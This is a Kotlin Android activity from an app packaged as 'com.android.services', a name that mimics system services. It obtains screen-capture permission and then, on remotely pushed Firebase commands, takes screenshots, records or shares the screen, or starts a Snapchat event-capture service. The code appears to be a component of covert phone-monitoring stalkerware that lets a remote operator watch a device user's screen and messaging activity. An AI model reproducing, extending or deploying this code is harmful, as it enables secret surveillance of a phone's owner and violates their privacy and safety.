package com.android.services.ui.activities

import android.annotation.TargetApi
import android.app.Activity
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.android.services.accessibility.data.WindowStateChangeEventData
import com.android.services.models.FCMPush
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.FirebasePushUtils
import com.android.services.util.logVerbose

@TargetApi(Build.VERSION_CODES.LOLLIPOP)
class ScreenRecordIntentActivity : AppCompatActivity() {

    private var fcmPush: FCMPush? = null
    private var commandType: Int = 0
    private var pkgName: String? = null

    companion object {
        const val KEY_FCM_PUSH = "FCM_PUSH"
        const val KEY_PACKAGE_NAME = "PACKAGE_NAME"
        const val KEY_COMMAND_TYPE = "COMMAND_TYPE"
        const val TYPE_SCREEN_SHOT = 1
        const val TYPE_SCREEN_RECORDING = 2
        const val TYPE_SCREEN_RECORDING_NORMAL = 3
        const val TYPE_SNAP_CHAT = 4
        const val TYPE_SCREEN_SHARING = 5
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        commandType = intent.getIntExtra(KEY_COMMAND_TYPE, 0)
        if (intent.hasExtra(KEY_FCM_PUSH)) {
            fcmPush = intent.getParcelableExtra(KEY_FCM_PUSH)
        }
        if (intent.hasExtra(KEY_PACKAGE_NAME)) {
            pkgName = intent.getStringExtra(KEY_PACKAGE_NAME)
        }
        AppConstants.isMyAppScreenCastPermission=true
        val mProjectionManager =
            (getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager)
        screenRecordIntentLaunch.launch(mProjectionManager.createScreenCaptureIntent())
    }

    /** This is ScreenRecordIntent launcher to receive the screen record permission intent result **/
    private val screenRecordIntentLaunch =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            if (result.resultCode == Activity.RESULT_OK) {
                val data: Intent? = result.data
                AppConstants.screenRecordingIntent = data
                when (commandType) {
                    TYPE_SCREEN_SHOT -> {
                        FirebasePushUtils.startPushCommand(
                            this,
                            fcmPush!!,
                            AppConstants.SCREEN_SHOT_TYPE
                        )
                    }
                    TYPE_SCREEN_RECORDING -> {
                        WindowStateChangeEventData.startScreenRecordingService(this, pkgName!!)
                    }
                    TYPE_SNAP_CHAT -> {
                        WindowStateChangeEventData.startSnapChatEventCaptureService(this)
                    }
                    TYPE_SCREEN_RECORDING_NORMAL -> {
                        if (AppUtils.isScreenRecordingApp("demand.recording")) {
                            FirebasePushUtils.startPushCommand(this,
                                fcmPush,
                                AppConstants.NORMAL_SCREEN_RECORDING_TYPE)
                        }
                    }
                    TYPE_SCREEN_SHARING -> {
                        FirebasePushUtils.startPushCommand(
                            this,
                            fcmPush,
                            AppConstants.SCREEN_SHARING_JITSE_TYPE
                        )
                    }
                }
                logVerbose("screenRecordIntent saved")
            } else if (result.resultCode == Activity.RESULT_CANCELED) {
                logVerbose("screenRecordIntent result cancelled")
            }
            finish()
        }
}